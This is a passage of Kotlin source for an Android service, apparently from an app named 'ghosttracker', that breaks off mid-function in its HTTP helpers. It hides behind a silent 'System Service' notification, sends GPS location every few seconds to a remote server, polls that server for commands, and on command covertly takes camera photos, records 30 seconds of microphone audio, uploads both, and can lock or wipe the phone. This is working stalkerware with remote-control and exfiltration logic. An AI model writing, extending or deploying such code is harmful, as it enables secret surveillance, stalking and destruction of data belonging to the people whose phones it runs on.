package com.ghosttracker.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.*
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class TrackingService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var locationManager: LocationManager
    private val client = OkHttpClient()
    private var lastLocation: Location? = null

    private val deviceId: String by lazy {
        val prefs = getSharedPreferences("gt", Context.MODE_PRIVATE)
        prefs.getString("device_id", null) ?: run {
            val id = "gt-" + UUID.randomUUID().toString().take(8)
            prefs.edit().putString("device_id", id).apply()
            id
        }
    }

    companion object {
        private const val CHANNEL_ID = "gt_channel"
        private const val NOTIF_ID = 1
        private val JSON = "application/json".toMediaType()
        private val SERVER = BuildConfig.SERVER_URL
        private val API_KEY = BuildConfig.API_KEY
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
        startLocationUpdates()
        scope.launch { commandLoop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?) = null

    // ── Notification (required for foreground service) ──────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(channel)
        }
    }

    private fun buildNotification() =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    // ── Location ─────────────────────────────────────────────────────────────

    private fun startLocationUpdates() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                lastLocation = location
                scope.launch { reportLocation(location) }
            }
            override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
        }
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 3000L, 0f, listener
            )
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER, 3000L, 0f, listener
            )
        } catch (e: SecurityException) { e.printStackTrace() }
    }

    private suspend fun reportLocation(loc: Location) {
        val body = JSONObject().apply {
            put("device_id", deviceId)
            put("lat", loc.latitude)
            put("lng", loc.longitude)
            put("accuracy", loc.accuracy)
            put("provider", loc.provider)
            put("timestamp", isoNow())
        }.toString().toRequestBody(JSON)
        post("/api/device/location", body)
    }

    // ── Command polling loop ──────────────────────────────────────────────────

    private suspend fun commandLoop() {
        while (true) {
            try {
                val response = get("/api/device/commands/$deviceId")
                response?.let {
                    val commands = JSONObject(it).getJSONArray("commands")
                    for (i in 0 until commands.length()) {
                        val cmd = commands.getJSONObject(i)
                        handleCommand(cmd.getInt("id"), cmd.getString("command"))
                    }
                }
            } catch (e: Exception) { e.printStackTrace() }
            delay(10_000)
        }
    }

    private suspend fun handleCommand(id: Int, command: String) {
        when (command) {
            "ping"          -> ackCommand(id)
            "capture_photo" -> { capturePhoto(); ackCommand(id) }
            "capture_audio" -> { captureAudio(); ackCommand(id) }
            "lock"          -> { lockDevice(); ackCommand(id) }
            "wipe"          -> { ackCommand(id); wipeDevice() }
        }
    }

    private suspend fun ackCommand(id: Int) {
        post("/api/device/commands/$id/ack", "{}".toRequestBody(JSON))
    }

    // ── Camera capture ────────────────────────────────────────────────────────

    private suspend fun capturePhoto() {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull() ?: return
            val file = File(cacheDir, "gt_photo_${System.currentTimeMillis()}.jpg")

            val handlerThread = HandlerThread("CameraThread").also { it.start() }
            val handler = Handler(handlerThread.looper)

            withContext(Dispatchers.Main) {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        val surfaces = mutableListOf<android.view.Surface>()
                        val reader = android.media.ImageReader.newInstance(
                            640, 480,
                            android.graphics.ImageFormat.JPEG, 1
                        )
                        reader.setOnImageAvailableListener({ r ->
                            val image = r.acquireLatestImage()
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            file.writeBytes(bytes)
                            image.close()
                            camera.close()
                            handlerThread.quitSafely()
                            scope.launch { uploadMedia("photo", bytes) }
                        }, handler)
                        surfaces.add(reader.surface)
                        camera.createCaptureSession(surfaces,
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    val request = camera.createCaptureRequest(
                                        CameraDevice.TEMPLATE_STILL_CAPTURE
                                    ).apply { addTarget(reader.surface) }
                                    session.capture(request.build(), null, handler)
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) {}
                            }, handler)
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close() }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close() }
                }, handler)
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    // ── Audio capture ─────────────────────────────────────────────────────────

    private suspend fun captureAudio() {
        try {
            val file = File(cacheDir, "gt_audio_${System.currentTimeMillis()}.mp4")
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(30_000) // Record for 30 seconds
            recorder.stop()
            recorder.release()
            uploadMedia("audio", file.readBytes())
            file.delete()
        } catch (e: Exception) { e.printStackTrace() }
    }

    // ── Media upload ──────────────────────────────────────────────────────────

    private suspend fun uploadMedia(type: String, bytes: ByteArray) {
        val body = JSONObject().apply {
            put("device_id", deviceId)
            put("type", type)
            put("data_b64", Base64.encodeToString(bytes, Base64.NO_WRAP))
            put("timestamp", isoNow())
        }.toString().toRequestBody(JSON)
        post("/api/device/media", body)
    }

    // ── Device admin actions ──────────────────────────────────────────────────

    private fun lockDevice() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        dpm.lockNow()
    }

    private fun wipeDevice() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        dpm.wipeData(0)
    }

    // ── HTTP helpers ──────────────────────────────────────────────────────────

    private suspend fun post(path: String, body: RequestBody